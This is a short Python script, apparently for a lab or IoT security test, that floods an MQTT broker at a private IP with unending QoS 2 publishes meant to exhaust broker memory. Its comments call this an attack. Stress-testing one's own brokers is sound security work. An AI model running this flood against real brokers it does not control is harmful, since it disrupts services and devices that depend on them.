import paho.mqtt.client as mqtt
import time

BROKER = "192.168.115.228"  # Change to your MQTT broker IP


def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")
    while True:
        try:
            # Sending QoS 2 messages but never completing the handshake
            client.publish("mpu6050/data", "memory_leak_test", qos=2)
        except Exception as e:
            print(f"Error: {e}")
            break


client = mqtt.Client()
client.on_connect = on_connect
client.connect(BROKER, 1883, 60)
client.loop_start()

time.sleep(5)  # Allow attack to run
client.loop_stop()
client.disconnect()
